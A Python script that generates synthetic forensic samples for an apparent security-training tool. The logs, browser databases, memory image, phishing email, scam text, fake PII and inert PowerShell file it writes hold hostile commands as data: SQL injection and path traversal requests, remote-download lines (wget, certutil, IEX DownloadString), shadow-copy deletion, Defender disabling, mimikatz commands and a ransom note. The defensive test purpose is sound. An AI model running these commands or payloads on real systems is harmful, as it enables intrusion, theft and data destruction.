#!/usr/bin/env python3
"""
Generate realistic (but completely harmless) sample artefacts for testing and demos.

    python make_samples.py

Creates data/samples/ containing:
  auth.log              Linux SSH brute-force -> compromise -> persistence
  access.log            Apache log with SQLi, scanning, web shell and exfiltration
  security_events.txt   Windows Security log export (brute force, new admin, log cleared)
  firewall.log          iptables log showing a port scan
  browser_history.db    Chrome-format History SQLite (crack site -> keygen download)
  places.sqlite         Firefox-format history
  sample_memory.raw     Synthetic RAM image with attack artefacts
  eicar.txt             Standard harmless AV test file
  phishing_email.txt    Spoofed bank email with failing SPF/DKIM/DMARC
  suspicious.ps1        Obfuscated PowerShell (inert - it only prints text)
  pii_document.txt      Document full of fake PII for the redaction tool
"""
import os
import random
import sqlite3
import struct
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent / "data" / "samples"
OUT.mkdir(parents=True, exist_ok=True)


def w(name, content, mode="w"):
    p = OUT / name
    with open(p, mode, **({"encoding": "utf-8"} if mode == "w" else {})) as f:
        f.write(content)
    print(f"  {name:24s} {p.stat().st_size:>10,} bytes")


# ----------------------------------------------------------------- auth.log
def auth_log():
    lines, t = [], datetime(2026, 3, 15, 2, 14, 22)
    ip = "203.0.113.45"
    users = ["root", "root", "admin", "oracle", "postgres", "ubuntu", "root",
             "test", "git", "jenkins", "root", "root"]
    for i, u in enumerate(users):
        ts = (t + timedelta(seconds=i * 3)).strftime("%b %d %H:%M:%S")
        inv = "invalid user " if u in ("oracle", "postgres", "test", "git", "jenkins") else ""
        lines.append(f"{ts} webserver sshd[{2891+i*2}]: Failed password for {inv}{u} "
                     f"from {ip} port {51234+i*2} ssh2")
    # noise
    for i in range(6):
        ts = (t + timedelta(minutes=1, seconds=i * 20)).strftime("%b %d %H:%M:%S")
        lines.append(f"{ts} webserver sshd[{3100+i}]: Connection closed by "
                     f"authenticating user root {ip} port {52000+i} [preauth]")
    succ = t + timedelta(minutes=5)
    lines += [
        f"{succ.strftime('%b %d %H:%M:%S')} webserver sshd[2951]: Accepted password for root from {ip} port 51302 ssh2",
        f"{succ.strftime('%b %d %H:%M:%S')} webserver sshd[2951]: pam_unix(sshd:session): session opened for user root by (uid=0)",
        f"{(succ+timedelta(minutes=1)).strftime('%b %d %H:%M:%S')} webserver useradd[2988]: new user: name=svcbackup, UID=0, GID=0, home=/home/svcbackup, shell=/bin/bash",
        f"{(succ+timedelta(minutes=1,seconds=33)).strftime('%b %d %H:%M:%S')} webserver usermod[2994]: add 'svcbackup' to group 'sudo'",
        f"{(succ+timedelta(minutes=2)).strftime('%b %d %H:%M:%S')} webserver passwd[3001]: password for 'svcbackup' changed by 'root'",
        f"{(succ+timedelta(minutes=2,seconds=19)).strftime('%b %d %H:%M:%S')} webserver sudo:  svcbackup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/update.sh",
        f"{(succ+timedelta(minutes=2,seconds=44)).strftime('%b %d %H:%M:%S')} webserver sudo:  svcbackup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/update.sh",
        f"{(succ+timedelta(minutes=3)).strftime('%b %d %H:%M:%S')} webserver crontab[3021]: (svcbackup) BEGIN EDIT (svcbackup)",
        f"{(succ+timedelta(minutes=3,seconds=12)).strftime('%b %d %H:%M:%S')} webserver crontab[3021]: (svcbackup) REPLACE (svcbackup)",
        f"{(succ+timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} webserver sudo:  svcbackup : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c history -c",
        f"{(succ+timedelta(minutes=4,seconds=30)).strftime('%b %d %H:%M:%S')} webserver sshd[2951]: pam_unix(sshd:session): session closed for user root",
    ]
    w("auth.log", "\n".join(lines) + "\n")


# ----------------------------------------------------------------- access.log
def access_log():
    lines = []
    normal_paths = ["/", "/index.html", "/about", "/products", "/contact", "/css/main.css",
                    "/js/app.js", "/img/logo.png", "/api/items", "/blog/post-1"]
    uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0",
           "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/121.0 Mobile"]
    t = datetime(2026, 3, 15, 1, 0, 0)
    random.seed(42)
    for i in range(120):
        ip = f"192.0.2.{random.randint(2, 240)}"
        ts = (t + timedelta(seconds=i * 20)).strftime("%d/%b/%Y:%H:%M:%S +0530")
        p = random.choice(normal_paths)
        lines.append(f'{ip} - - [{ts}] "GET {p} HTTP/1.1" 200 {random.randint(400, 9000)} '
                     f'"https://www.google.com/" "{random.choice(uas)}"')
    atk = datetime(2026, 3, 15, 3, 12, 0)
    aip = "198.51.100.23"
    attack = [
        ("GET", "/index.php?id=1%27%20OR%20%271%27=%271", 200, 4821, "sqlmap/1.7"),
        ("GET", "/index.php?id=1%20AND%20SLEEP(5)--", 200, 4102, "sqlmap/1.7"),
        ("GET", "/index.php?id=-1%20UNION%20SELECT%20username,password%20FROM%20users--", 200, 9134, "sqlmap/1.7"),
        ("GET", "/admin/", 404, 209, "gobuster/3.6"), ("GET", "/backup/", 404, 209, "gobuster/3.6"),
        ("GET", "/phpmyadmin/", 404, 209, "gobuster/3.6"), ("GET", "/wp-admin/", 404, 209, "gobuster/3.6"),
        ("GET", "/administrator/", 404, 209, "gobuster/3.6"), ("GET", "/console/", 404, 209, "gobuster/3.6"),
        ("GET", "/.git/config", 200, 481, "gobuster/3.6"), ("GET", "/.env", 200, 1203, "gobuster/3.6"),
        ("GET", "/config.bak", 404, 209, "gobuster/3.6"), ("GET", "/db.sql", 404, 209, "gobuster/3.6"),
        ("GET", "/page.php?f=../../../../etc/passwd", 200, 2317, "curl/8.2.1"),
        ("GET", "/page.php?f=....//....//etc/shadow", 403, 199, "curl/8.2.1"),
        ("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, 3120, "curl/8.2.1"),
        ("POST", "/upload.php", 200, 312, "curl/8.2.1"),
        ("GET", "/uploads/shell.php?cmd=whoami", 200, 44, "curl/8.2.1"),
        ("GET", "/uploads/shell.php?cmd=cat%20/etc/passwd", 200, 2317, "curl/8.2.1"),
        ("GET", "/export/customers.csv", 200, 48211934, "curl/8.2.1"),
        ("GET", "/export/orders_full.csv", 200, 91883021, "curl/8.2.1"),
    ]
    for i, (m, p, s, sz, ua) in enumerate(attack):
        ts = (atk + timedelta(seconds=i * 17)).strftime("%d/%b/%Y:%H:%M:%S +0530")
        lines.append(f'{aip} - - [{ts}] "{m} {p} HTTP/1.1" {s} {sz} "-" "{ua}"')
    for i in range(40):
        ip = f"192.0.2.{random.randint(2, 240)}"
        ts = (datetime(2026, 3, 15, 4, 0) + timedelta(seconds=i * 30)).strftime("%d/%b/%Y:%H:%M:%S +0530")
        lines.append(f'{ip} - - [{ts}] "GET {random.choice(normal_paths)} HTTP/1.1" 200 '
                     f'{random.randint(400, 9000)} "-" "{random.choice(uas)}"')
    w("access.log", "\n".join(lines) + "\n")


# ----------------------------------------------------------------- windows
def windows_log():
    out, t = [], datetime(2026, 3, 15, 1, 5, 0)

    def blk(eid, desc, **kw):
        nonlocal t
        t += timedelta(seconds=random.randint(3, 45))
        s = [f"Log Name:      Security",
             f"Source:        Microsoft-Windows-Security-Auditing",
             f"Date:          {t.strftime('%m/%d/%Y %I:%M:%S %p')}",
             f"Event ID:      {eid}",
             f"Task Category: Logon",
             f"Level:         Information",
             f"Computer:      WIN-FINANCE-01.corp.local",
             f"Description:   {desc}"]
        for k, v in kw.items():
            s.append(f"    {k}: {v}")
        return "\n".join(s) + "\n"

    random.seed(7)
    for _ in range(4):
        out.append(blk(4624, "An account was successfully logged on.",
                       **{"Account Name": "priya.n", "Logon Type": "2",
                          "Source Network Address": "-"}))
    for _ in range(14):
        out.append(blk(4625, "An account failed to log on.",
                       **{"Account Name": "administrator", "Logon Type": "10",
                          "Source Network Address": "203.0.113.99",
                          "Failure Reason": "Unknown user name or bad password",
                          "Status": "0xC000006D", "Sub Status": "0xC000006A"}))
    out.append(blk(4624, "An account was successfully logged on.",
                   **{"Account Name": "administrator", "Logon Type": "10",
                      "Source Network Address": "203.0.113.99",
                      "Logon Process": "User32", "Authentication Package": "Negotiate"}))
    out.append(blk(4672, "Special privileges assigned to new logon.",
                   **{"Account Name": "administrator",
                      "Privileges": "SeDebugPrivilege, SeTakeOwnershipPrivilege"}))
    out.append(blk(4720, "A user account was created.",
                   **{"Account Name": "svc_backup01", "Subject Account": "administrator"}))
    out.append(blk(4732, "A member was added to a security-enabled local group.",
                   **{"Group Name": "Administrators", "Member": "svc_backup01"}))
    out.append(blk(7045, "A new service was installed in the system.",
                   **{"Service Name": "WinUpdateHelper",
                      "Service File Name": "C:\\Windows\\Temp\\svchost32.exe",
                      "Start Type": "auto start"}))
    out.append(blk(4698, "A scheduled task was created.",
                   **{"Task Name": "\\Microsoft\\Windows\\UpdateOrchestrator\\SyncHelper",
                      "Subject Account": "administrator"}))
    out.append(blk(4104, "Creating Scriptblock text.",
                   **{"ScriptBlock": "powershell -nop -w hidden -enc "
                                     "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}))
    out.append(blk(5001, "Real-time protection was disabled.",
                   **{"Product": "Windows Defender Antivirus"}))
    out.append(blk(1116, "Windows Defender Antivirus has detected malware.",
                   **{"Threat Name": "Ransom:Win32/Generic",
                      "Path": "C:\\Users\\priya.n\\Downloads\\Invoice_March.pdf.exe"}))
    out.append(blk(1102, "The audit log was cleared.",
                   **{"Subject Account": "administrator", "Subject Domain": "CORP"}))
    w("security_events.txt", "\n".join(out))


# ----------------------------------------------------------------- firewall
def firewall_log():
    lines, t = [], datetime(2026, 3, 15, 2, 0, 0)
    random.seed(3)
    attacker = "203.0.113.77"
    for i, port in enumerate(sorted(random.sample(range(20, 9200), 60))):
        ts = (t + timedelta(seconds=i)).strftime("%b %d %H:%M:%S")
        lines.append(f"{ts} gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e "
                     f"SRC={attacker} DST=10.0.0.5 LEN=60 TTL=54 PROTO=TCP SPT={random.randint(40000,60000)} "
                     f"DPT={port} WINDOW=1024 SYN")
    for i in range(25):
        ts = (t + timedelta(minutes=2, seconds=i * 4)).strftime("%b %d %H:%M:%S")
        lines.append(f"{ts} gateway kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.{random.randint(2,250)} "
                     f"DST=10.0.0.5 LEN=44 TTL=51 PROTO=TCP SPT={random.randint(1024,65000)} DPT=3389 SYN")
    for i in range(18):
        ts = (t + timedelta(minutes=4, seconds=i * 6)).strftime("%b %d %H:%M:%S")
        lines.append(f"{ts} gateway kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.{random.randint(2,250)} "
                     f"DST=10.0.0.5 LEN=40 TTL=48 PROTO=TCP SPT={random.randint(1024,65000)} DPT=445 SYN")
    for i in range(30):
        ts = (t + timedelta(minutes=6, seconds=i * 10)).strftime("%b %d %H:%M:%S")
        lines.append(f"{ts} gateway kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.168.1.{random.randint(2,60)} "
                     f"DST=10.0.0.5 LEN=52 TTL=64 PROTO=TCP SPT={random.randint(1024,65000)} DPT=443 SYN")
    w("firewall.log", "\n".join(lines) + "\n")


# ----------------------------------------------------------------- browsers
def chrome_history():
    p = OUT / "browser_history.db"
    if p.exists():
        p.unlink()
    c = sqlite3.connect(p)
    c.executescript("""
      CREATE TABLE urls(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR,
        visit_count INTEGER DEFAULT 0, typed_count INTEGER DEFAULT 0,
        last_visit_time INTEGER NOT NULL, hidden INTEGER DEFAULT 0);
      CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER NOT NULL,
        visit_time INTEGER NOT NULL, from_visit INTEGER, transition INTEGER DEFAULT 0);
      CREATE TABLE downloads(id INTEGER PRIMARY KEY, guid VARCHAR, current_path LONGVARCHAR,
        target_path LONGVARCHAR, start_time INTEGER, received_bytes INTEGER,
        total_bytes INTEGER, state INTEGER, danger_type INTEGER, tab_url LONGVARCHAR);
      CREATE TABLE keyword_search_terms(keyword_id INTEGER, url_id INTEGER,
        lower_term LONGVARCHAR, term LONGVARCHAR);
      CREATE TABLE cookies(creation_utc INTEGER, host_key TEXT, name TEXT, value TEXT,
        path TEXT, expires_utc INTEGER, is_secure INTEGER, is_httponly INTEGER);
      CREATE TABLE logins(origin_url VARCHAR, username_value VARCHAR,
        password_value BLOB, date_created INTEGER, times_used INTEGER);
    """)

    def wk(dt):
        return int((dt - datetime(1601, 1, 1, tzinfo=timezone.utc)).total_seconds() * 1_000_000)

    base = datetime(2026, 3, 14, 21, 5, tzinfo=timezone.utc)
    rows = [
        ("https://www.google.com/", "Google", 142, 60, 0),
        ("https://mail.google.com/mail/u/0/", "Inbox - Gmail", 88, 12, 5),
        ("https://www.youtube.com/", "YouTube", 64, 20, 20),
        ("https://github.com/", "GitHub", 41, 15, 35),
        ("https://stackoverflow.com/questions/", "Stack Overflow", 33, 4, 50),
        ("https://www.google.com/search?q=photoshop+2026+free+download+full+version",
         "photoshop 2026 free download full version - Google Search", 3, 1, 180),
        ("https://www.google.com/search?q=photoshop+crack+keygen", "photoshop crack keygen - Google Search", 2, 1, 185),
        ("http://free-crack-download.xyz/adobe-photoshop-2026-keygen",
         "Adobe Photoshop 2026 CRACK + KEYGEN Free Download", 4, 0, 190),
        ("http://free-crack-download.xyz/download.php?file=ps2026_keygen",
         "Download - free-crack-download", 2, 0, 194),
        ("http://dl-mirror-fast.top/get/ps2026_keygen.exe", "Downloading…", 1, 0, 196),
        ("https://amazon-security-login.xyz/verify?ref=ord99213",
         "Amazon - Verify your account", 2, 0, 240),
        ("http://sbi-kyc-update.tk/login.php", "SBI Online - KYC Update", 1, 0, 246),
        ("https://anonfiles.com/upload", "AnonFiles - Upload", 3, 1, 300),
        ("https://temp-mail.org/en/", "Temp Mail - Disposable Email", 5, 2, 305),
        ("https://www.icicibank.com/personal-banking", "ICICI Bank - Personal Banking", 12, 8, 400),
        ("https://www.linkedin.com/feed/", "LinkedIn", 27, 6, 420),
        ("https://chat.openai.com/", "ChatGPT", 19, 9, 440),
        ("https://www.flipkart.com/", "Flipkart", 15, 5, 460),
    ]
    for i, (u, t_, vc, tc, off) in enumerate(rows, 1):
        ts = wk(base + timedelta(minutes=off))
        c.execute("INSERT INTO urls VALUES(?,?,?,?,?,?,0)", (i, u, t_, vc, tc, ts))
        c.execute("INSERT INTO visits VALUES(?,?,?,0,805306368)", (i, i, ts))
    c.execute("""INSERT INTO downloads VALUES(1,'g1','C:\\Users\\rahul\\Downloads\\ps2026_keygen.exe',
                 'C:\\Users\\rahul\\Downloads\\ps2026_keygen.exe',?,5242880,5242880,1,0,?)""",
              (wk(base + timedelta(minutes=197)), "http://dl-mirror-fast.top/get/ps2026_keygen.exe"))
    c.execute("""INSERT INTO downloads VALUES(2,'g2','C:\\Users\\rahul\\Downloads\\Invoice_March.pdf.exe',
                 'C:\\Users\\rahul\\Downloads\\Invoice_March.pdf.exe',?,184320,184320,1,1,?)""",
              (wk(base + timedelta(minutes=250)), "https://amazon-security-login.xyz/attach/inv.php"))
    c.execute("""INSERT INTO downloads VALUES(3,'g3','C:\\Users\\rahul\\Downloads\\report_q1.pdf',
                 'C:\\Users\\rahul\\Downloads\\report_q1.pdf',?,921600,921600,1,0,?)""",
              (wk(base + timedelta(minutes=410)), "https://www.icicibank.com/docs/report_q1.pdf"))
    for kid, uid, term in [(1, 6, "photoshop 2026 free download full version"),
                           (2, 7, "photoshop crack keygen"),
                           (3, 1, "how to disable windows defender"),
                           (4, 1, "best antivirus india")]:
        c.execute("INSERT INTO keyword_search_terms VALUES(?,?,?,?)", (kid, uid, term.lower(), term))
    for host, name, sec, ho in [("www.google.com", "SID", 1, 1), ("github.com", "user_session", 1, 1),
                                ("free-crack-download.xyz", "trk", 0, 0),
                                ("amazon-security-login.xyz", "sess", 0, 0),
                                ("www.icicibank.com", "JSESSIONID", 1, 1)]:
        c.execute("INSERT INTO cookies VALUES(?,?,?,'[encrypted]','/',?,?,?)",
                  (wk(base), host, name, wk(base + timedelta(days=30)), sec, ho))
    for site, user, used in [("https://mail.google.com/", "rahul.sharma98@gmail.com", 42),
                             ("https://github.com/login", "rahul-dev", 18),
                             ("https://www.icicibank.com/login", "rahul_s", 7),
                             ("https://www.flipkart.com/account/login", "9876543210", 11)]:
        c.execute("INSERT INTO logins VALUES(?,?,?,?,?)",
                  (site, user, b"v10_encrypted_blob", wk(base - timedelta(days=200)), used))
    c.commit()
    c.close()
    print(f"  browser_history.db      {p.stat().st_size:>10,} bytes")


def firefox_places():
    p = OUT / "places.sqlite"
    if p.exists():
        p.unlink()
    c = sqlite3.connect(p)
    c.executescript("""
      CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR,
        visit_count INTEGER DEFAULT 0, typed INTEGER DEFAULT 0, last_visit_date INTEGER);
      CREATE TABLE moz_historyvisits(id INTEGER PRIMARY KEY, place_id INTEGER,
        visit_date INTEGER, visit_type INTEGER);
      CREATE TABLE moz_bookmarks(id INTEGER PRIMARY KEY, fk INTEGER, title LONGVARCHAR,
        dateAdded INTEGER);
      CREATE TABLE moz_cookies(id INTEGER PRIMARY KEY, host TEXT, name TEXT, value TEXT,
        path TEXT, isSecure INTEGER, isHttpOnly INTEGER);
    """)
    base = datetime(2026, 3, 14, 20, 0, tzinfo=timezone.utc)

    def ff(dt):
        return int(dt.timestamp() * 1_000_000)

    rows = [("https://www.mozilla.org/", "Mozilla", 12, 3, 0),
            ("https://duckduckgo.com/", "DuckDuckGo", 40, 22, 10),
            ("http://darkmarket-hidden.onion.ly/", "Hidden Market Mirror", 2, 1, 60),
            ("https://protonmail.com/", "Proton Mail", 8, 4, 90),
            ("http://paypa1-secure-login.com/signin", "PayPal - Sign In", 1, 0, 120),
            ("https://www.wikipedia.org/", "Wikipedia", 25, 9, 150)]
    for i, (u, t_, vc, ty, off) in enumerate(rows, 1):
        d = ff(base + timedelta(minutes=off))
        c.execute("INSERT INTO moz_places VALUES(?,?,?,?,?,?)", (i, u, t_, vc, ty, d))
        c.execute("INSERT INTO moz_historyvisits VALUES(?,?,?,1)", (i, i, d))
    c.execute("INSERT INTO moz_bookmarks VALUES(1,2,'DuckDuckGo',?)", (ff(base),))
    c.execute("INSERT INTO moz_cookies VALUES(1,'duckduckgo.com','pref','v1','/',1,1)")
    c.commit()
    c.close()
    print(f"  places.sqlite           {p.stat().st_size:>10,} bytes")


# ----------------------------------------------------------------- memory
def memory_image():
    random.seed(11)
    blocks = [os.urandom(400_000)]
    legit = ("System smss.exe csrss.exe wininit.exe winlogon.exe services.exe lsass.exe "
             "svchost.exe spoolsv.exe explorer.exe dwm.exe taskhostw.exe RuntimeBroker.exe "
             "SearchIndexer.exe conhost.exe chrome.exe OUTLOOK.EXE WINWORD.EXE ").encode()
    blocks.append(legit * 40)
    blocks.append(os.urandom(250_000))
    evil = b"""
svch0st.exe  lsasss.exe  scvhost.exe  explorer32.exe  a8f3kd92mx.exe
mimikatz.exe  procdump.exe  nc.exe  psexec.exe  lazagne.exe  ultraviewer.exe  xmrig.exe
C:\\Windows\\System32\\cmd.exe /c powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/stage2.ps1')"
C:\\Windows\\Temp\\svchost32.exe  C:\\Users\\priya.n\\AppData\\Local\\Temp\\update.exe
certutil.exe -urlcache -split -f http://203.0.113.99/p.txt payload.exe
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"
vssadmin.exe delete shadows /all /quiet   wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled No
schtasks /create /sc minute /mo 5 /tn "WinUpdateHelper" /tr C:\\Windows\\Temp\\svchost32.exe
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Windows\\Temp\\svchost32.exe
Set-MpPreference -DisableRealtimeMonitoring $true
203.0.113.99:4444   198.51.100.7:50050   45.33.32.156:1337   10.0.0.15:445   192.168.1.20:3389
185.220.101.44:9050   8.8.8.8:53   10.0.0.1:53   172.16.4.9:6667
VirtualAllocEx WriteProcessMemory CreateRemoteThread SetThreadContext ZwUnmapViewOfSection
QueueUserAPC RtlCreateUserThread PAGE_EXECUTE_READWRITE ReflectiveLoader
IsDebuggerPresent CheckRemoteDebuggerPresent NtQueryInformationProcess
GetAsyncKeyState SetWindowsHookEx GetForegroundWindow
cobaltstrike beacon.x64.dll \\\\.\\pipe\\msagent_a1  meterpreter  stage.dll
sekurlsa::logonpasswords  kerberos::golden  lsadump::sam  privilege::debug
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
5f4dcc3b5aa765d61d8327deb882cf99:e10adc3949ba59abbe56e057f20f883e
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Zr7SAMPLEKEYDATANOTREALJUSTFORTESTINGPURPOSES1234
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.FAKESIGNATURE123
AKIAIOSFODNN7EXAMPLE   ghp_16CharsFakeTokenForTestingOnly123456
password=Adm1n@Corp2026   DB_PASSWORD=Sup3rS3cret!2026
YOUR FILES HAVE BEEN ENCRYPTED! To decrypt contact us at recovery@mailfence.com
Send 0.5 BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 within 72 hours
Visit http://decrypt7xk3mn.onion using Tor Browser
http://203.0.113.99/gate.php  http://evil-c2-panel.xyz/panel/checkin.php
stratum+tcp://pool.minexmr.com:4444  --donate-level 1
wininet.dll ws2_32.dll crypt32.dll advapi32.dll ntdll.dll kernel32.dll bcrypt.dll
a7f3k2m9x1.dll  q8w2e5r7t3.dll
C:\\Users\\priya.n\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
cookies.sqlite  places.sqlite  wallet.dat  key3.db
"""
    blocks.append(evil * 3)
    blocks.append(os.urandom(300_000))
    blocks.append(legit * 20)
    blocks.append(os.urandom(200_000))
    data = b"".join(blocks)
    w("sample_memory.raw", data, mode="wb")


# ----------------------------------------------------------------- misc
def misc_files():
    w("eicar.txt", r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    w("phishing_email.txt", """Delivered-To: priya.n@corp.local
Received: from mail-relay-07.bulkmailsend.ru (203.0.113.88)
Authentication-Results: mx.corp.local;
       spf=fail (domain of hdfcbank.com does not designate 203.0.113.88 as permitted sender);
       dkim=fail header.d=hdfcbank.com;
       dmarc=fail (p=REJECT) header.from=hdfcbank.com
From: "HDFC Bank Security Team" <alerts@hdfcbank.com>
Reply-To: recovery.desk909@gmail.com
To: priya.n@corp.local
Subject: URGENT: Unauthorized transaction detected - Account will be SUSPENDED in 24 hours
Date: Sat, 15 Mar 2026 02:41:09 +0530
X-Mailer: PHPMailer 5.2.9
Content-Type: text/html; charset=UTF-8

Dear Customer,

We have detected an UNAUTHORIZED TRANSACTION of Rs. 49,999.00 on your account
ending 4421 from an unrecognised device.

Your account has been temporarily restricted. To reverse this transaction and
restore full access, you must verify your identity IMMEDIATELY.

<a href="http://hdfc-secure-verify.tk/login.php?ref=88213">https://www.hdfcbank.com/secure/verify</a>

You will need to provide:
  - Registered mobile number
  - Debit card number and expiry date
  - CVV number
  - OTP received on your mobile
  - Net banking password

FAILURE TO COMPLETE VERIFICATION WITHIN 24 HOURS WILL RESULT IN PERMANENT
ACCOUNT CLOSURE AND LEGAL ACTION AS PER RBI GUIDELINES.

Kindly do the needful immediatly.

Yours faithfuly,
HDFC Bank Security Team
Attachment: Transaction_Details_March.pdf.exe
""")

    w("suspicious.ps1", '''# SAMPLE FILE FOR ANALYSIS PRACTICE - INTENTIONALLY INERT
# Every dangerous call below is COMMENTED OUT. This script only prints a message.
# It exists so the Malware Analyzer has realistic patterns to detect.

$ErrorActionPreference = "SilentlyContinue"
Write-Host "This is a harmless sample used by the CyberSafe platform for training."

# --- obfuscation patterns (inert) -------------------------------------------
$a = "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA"
$b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($a))
# Invoke-Expression $b            # <-- disabled

$parts = "Down" + "load" + "String"
$u1 = "htt" + "p://" + "203.0.113.99" + "/stage2.ps1"
# (New-Object Net.WebClient).$parts($u1)      # <-- disabled

# --- persistence (inert) -----------------------------------------------------
# New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
#   -Name "Updater" -Value "C:\\Windows\\Temp\\svchost32.exe"
# schtasks /create /sc minute /mo 5 /tn "WinUpdateHelper" /tr "C:\\Windows\\Temp\\svchost32.exe"

# --- defense evasion (inert) -------------------------------------------------
# Set-MpPreference -DisableRealtimeMonitoring $true
# Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"

# --- destructive (inert) -----------------------------------------------------
# vssadmin delete shadows /all /quiet
# wbadmin delete catalog -quiet
# bcdedit /set {default} recoveryenabled No

# --- injection API references (strings only) ---------------------------------
$apis = @("VirtualAllocEx","WriteProcessMemory","CreateRemoteThread","SetThreadContext")

Write-Host "Sample complete. Nothing was executed."
''')

    w("breach_corpus_sample.txt", """# Sample credential dump for the Breach Checker import feature.
# SYNTHETIC DATA ONLY - none of these are real accounts or real passwords.
# Demonstrates the three supported line formats.
priya.nair@corp.local:Summer2026!
rahul.sharma@corp.local;Welcome@123
amit.kumar@corp.local,hunter2
sneha.patel@corp.local:india@1947
vikram.rao@corp.local
admin@corp.local:P@ssw0rd
hr.payroll@corp.local:Hr#2026pay
finance@corp.local:M0ney$2026
support@corp.local:support123
devops@corp.local:Dev0ps!2026
""")

    w("pii_document.txt", """INTERNAL SUPPORT TICKET #SR-2026-88421
=======================================
Reported by: Rahul Sharma
Employee ID: EMP-4471
Department: Finance

CUSTOMER DETAILS (as provided by caller)
----------------------------------------
Name           : Priya Nair
Aadhaar Number : 4521 8834 9012
PAN Card       : ABCPS1234K
Date of Birth  : 14/07/1998
Mobile         : +91 98765 43210
Alt Mobile     : 9123456789
Email          : priya.nair1998@gmail.com
Address        : 402, Sunrise Apartments, Andheri West, Mumbai 400058

BANKING DETAILS
---------------
Account Number : 501000123456789
IFSC Code      : HDFC0001234
Debit Card     : 4532 7789 1234 5678
Expiry         : 08/28
CVV            : 419
UPI ID         : priya.nair@okhdfcbank

VEHICLE / OTHER
---------------
Vehicle Number : MH 02 AB 1234
Passport       : M1234567

SYSTEM / DEV NOTES (please remove before sharing externally)
------------------------------------------------------------
Test server    : 203.0.113.45
Admin login    : admin
DB_PASSWORD=Sup3rS3cret!2026
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
GITHUB_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwxyz
Connection     : postgresql://appuser:Pgpass2026!@10.0.0.9:5432/customers
Session JWT    : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcd1234efgh
MAC Address    : 00:1A:2B:3C:4D:5E

ACTION: Customer reports Rs 49,999 debited after clicking an SMS link.
Advised to call 1930 and file at cybercrime.gov.in.
""")

    w("scam_message.txt", """CONGRATULATIONS!!! You have been SELECTED!

AMAZON INDIA - WORK FROM HOME PART TIME JOB 2026

Earn Rs. 3000-5000 per day working only 2-3 hours daily!
No experience needed - 10th pass can also apply!
Direct joining - NO INTERVIEW required!
Only 12 seats remaining - hurry!

WHAT YOU DO:
Simple task based job - just like and review products on our app.
Complete 20 tasks daily and earn instantly!

TO CONFIRM YOUR SEAT:
Pay a REFUNDABLE security deposit of Rs. 1,999 to:
UPI ID: hrteam.amazon@ybl
Or scan the QR code sent on WhatsApp.

Also send the following documents for identity verification:
- Aadhaar card photo (front and back)
- PAN card photo
- Cancelled cheque
- Bank account details

Contact HR Manager on WhatsApp: +91 91234 56789
Telegram group: t.me/amazonjobs2026india

Offer expires TODAY at midnight. Reply fast!

Regards,
HR Team
Amazon India Recruitment
hr.amazon.india2026@gmail.com
""")


if __name__ == "__main__":
    print("Generating sample artefacts in data/samples/ …\n")
    auth_log()
    access_log()
    windows_log()
    firewall_log()
    chrome_history()
    firefox_places()
    memory_image()
    misc_files()
    print(f"\nDone. {len(list(OUT.iterdir()))} files created in {OUT}")
    print("\nAll samples are synthetic and harmless. The .ps1 file is inert (everything")
    print("dangerous is commented out) and eicar.txt is the standard AV test string.")
